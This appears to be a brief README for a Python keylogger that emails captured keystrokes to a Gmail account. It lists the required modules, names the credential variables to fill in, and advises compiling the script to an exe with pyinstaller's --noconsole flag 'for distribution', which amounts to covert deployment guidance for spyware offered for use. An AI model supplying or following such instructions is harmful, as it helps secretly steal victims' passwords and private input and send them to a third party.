# Keylogger
A python keylogger that sends its logs to gmail. You'll need to allow less secure apps from the options in gmail to receive your logs.

You'll need the pyHook and pythoncom modules for this to work.

Adaptation of https://github.com/ajinabraham/Xenotix-Python-Keylogger

To use it simply change the following variables:

```
USER
PASS
TO
```

To your specifications and compile the script to exe with pyinstaller for distribution, use the --noconsole flag when compiling.
